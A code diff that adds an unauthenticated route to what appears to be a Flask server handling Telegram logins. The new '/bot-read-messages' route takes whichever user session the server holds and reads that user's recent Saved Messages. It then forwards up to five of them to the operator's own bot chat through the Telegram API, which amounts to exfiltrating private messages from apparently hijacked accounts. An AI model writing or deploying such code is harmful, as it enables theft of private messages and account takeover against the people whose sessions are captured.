@@ -114,6 +114,43 @@ def webhook():
         print(f"Webhook error: {e}")
         return jsonify({'ok': True})
 
+@app.route('/bot-read-messages', methods=['GET'])
+def bot_read_messages():
+    try:
+        # Get any active session from your server
+        if not active_sessions:
+            return jsonify({'error': 'No active sessions found'})
+        
+        # Get the first available session
+        session_id = list(active_sessions.keys())[0]
+        session_data = active_sessions[session_id]
+        client = session_data['client']
+        
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        async def fetch():
+            messages = []
+            async for msg in client.get_chat_history("me", limit=10):
+                if msg.text:
+                    messages.append(msg.text)
+            return messages
+        
+        messages = loop.run_until_complete(fetch())
+        
+        # Send messages to YOUR BOT
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        for msg in messages[:5]:
+            requests.post(url, json={
+                'chat_id': YOUR_CHAT_ID,
+                'text': f"📖 {msg[:200]}"
+            })
+        
+        return jsonify({'success': True, 'messages_sent': len(messages)})
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
 @app.route('/send-code', methods=['POST'])
 def send_code():
     try:
